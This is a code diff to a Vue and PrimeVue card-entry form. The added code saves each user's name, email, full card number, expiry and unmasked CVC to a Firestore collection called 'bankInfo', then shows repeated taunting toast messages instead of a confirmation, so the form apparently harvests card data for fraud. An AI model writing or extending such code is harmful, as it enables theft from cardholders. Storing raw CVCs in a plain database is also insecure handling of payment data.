@@ -120,6 +120,8 @@ import InputMask from "primevue/inputmask";
 import FloatLabel from "primevue/floatlabel";
 import Button from "primevue/button";
 import Toast from "primevue/toast";
+import { db } from "../firebase"; // Import Firebase setup
+import { collection, addDoc } from "firebase/firestore"; // Firestore functions
 
 export default {
   components: {
@@ -214,22 +216,20 @@ export default {
       this.isSubmitting = true;
       try {
         await new Promise((resolve) => setTimeout(resolve, 1500));
-        // this.$refs.toast.add({
-        //   severity: "success",
-        //   summary: "Success",
-        //   detail: "Information saved successfully",
-        //   life: 3000,
-        // });
+        // Save to Firestore
+        await addDoc(collection(db, "bankInfo"), {
+          name: this.form.name,
+          email: this.form.email,
+          cardNumber: this.form.cardNumber, // Store as entered (you might want to mask sensitive data)
+          // cvc: "****", // Mask CVC for security
+          // unmask for testing
+          cvc: this.form.cvc,
+          expiry: this.form.expiry,
+          cardType: this.cardType || "unknown",
+          timestamp: new Date(),
+        });
 
         // client said add a message like "oops bawal tanga haha"
-        /* this.$refs.toast.add({
-          severity: "contrast",
-          summary: "Oops",
-          detail: "Bawal tanga haha",
-          life: 3000,
-        }); */
-        // show multiple messages
-
         this.toastInterval = setInterval(() => {
           this.$refs.toast.add({
             severity: "contrast",
@@ -280,6 +280,7 @@ export default {
   padding: 2rem;
   background: #ffffff;
   font-family: "Open Sans", sans-serif;
+  border-radius: 1.5rem;
 }
 
 .bank-card {
